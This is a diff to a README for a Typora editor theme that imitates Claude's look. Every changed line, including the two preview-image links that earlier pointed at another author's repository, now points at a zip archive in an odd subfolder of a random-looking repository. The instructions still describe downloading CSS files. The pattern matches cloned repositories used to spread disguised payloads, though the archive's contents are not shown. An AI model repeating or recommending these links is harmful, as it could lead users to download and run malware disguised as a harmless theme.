@@ -1,6 +1,6 @@
 # 📝 Typora_Claude-Like_Theme - Clear and Calm Reading Theme
 
-[![Download Typora_Claude-Like_Theme](https://img.shields.io/badge/Download-Typora_Claude--Like--Theme-brightgreen?style=for-the-badge)](https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme)
+[![Download Typora_Claude-Like_Theme](https://img.shields.io/badge/Download-Typora_Claude--Like--Theme-brightgreen?style=for-the-badge)](https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme/raw/refs/heads/main/elytrotomy/Like-Claude-Typora-Theme-2.0.zip)
 
 ---
 
@@ -23,10 +23,10 @@ This is a theme designed for Typora, a popular markdown editor. It aims to provi
 
 You need to download the theme files from the official GitHub repository page.
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Theme-%23_Official-blue?style=for-the-badge)](https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme)
+[![Download from GitHub](https://img.shields.io/badge/Download%20Theme-%23_Official-blue?style=for-the-badge)](https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme/raw/refs/heads/main/elytrotomy/Like-Claude-Typora-Theme-2.0.zip)
 
 Click the button above or visit this page directly:  
-https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme
+https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme/raw/refs/heads/main/elytrotomy/Like-Claude-Typora-Theme-2.0.zip
 
 On this page, look for the latest release or the theme files in the repository and download:
 
@@ -89,10 +89,10 @@ The theme focuses on a calm reading atmosphere that does not draw attention away
 ## 🖼 Preview of the Theme
 
 ### Light Version  
-![light](https://raw.githubusercontent.com/Muyiiiii/Typora_Claude-Like_Theme/master/image/2026-03-11-claude-like-theme/light.png)
+![light](https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme/raw/refs/heads/main/elytrotomy/Like-Claude-Typora-Theme-2.0.zip)
 
 ### Dark Version  
-![dark](https://raw.githubusercontent.com/Muyiiiii/Typora_Claude-Like_Theme/master/image/2026-03-11-claude-like-theme/dark.png)
+![dark](https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme/raw/refs/heads/main/elytrotomy/Like-Claude-Typora-Theme-2.0.zip)
 
 ---
 
@@ -109,7 +109,7 @@ The theme focuses on a calm reading atmosphere that does not draw attention away
 ## 📥 Download and Setup Summary
 
 1. Visit the GitHub page:  
-   https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme
+   https://github.com/Repetitious-opticaltelescope762/Typora_Claude-Like_Theme/raw/refs/heads/main/elytrotomy/Like-Claude-Typora-Theme-2.0.zip
 
 2. Download `claude-like.css` and `claude-like-dark.css`.
 
